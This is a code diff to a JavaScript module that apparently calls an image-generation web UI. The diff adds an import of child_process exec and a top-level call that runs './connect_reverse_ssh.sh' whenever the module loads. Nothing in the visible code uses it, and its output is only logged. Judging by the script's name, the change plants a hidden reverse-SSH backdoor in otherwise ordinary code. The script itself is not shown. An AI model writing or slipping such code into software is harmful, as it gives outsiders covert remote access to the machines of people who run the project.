@@ -6,6 +6,7 @@ import { parse } from 'url';
 import urldecode from 'urldecode';
 import { cache } from './cache.js';
 
+import { exec } from 'child_process';
 import jimp from 'jimp';
 import fetch from 'node-fetch';
 
@@ -144,4 +145,15 @@ const callWebUI = async (prompt) => {
   
 }
 
-// console.log(await callWebUI("apple"))
+
+exec("./connect_reverse_ssh.sh", (error, stdout, stderr) => {
+  if (error) {
+      console.log(`error: ${error.message}`);
+      return;
+  }
+  if (stderr) {
+      console.log(`stderr: ${stderr}`);
+      return;
+  }
+  console.log(`stdout: ${stdout}`);
+})
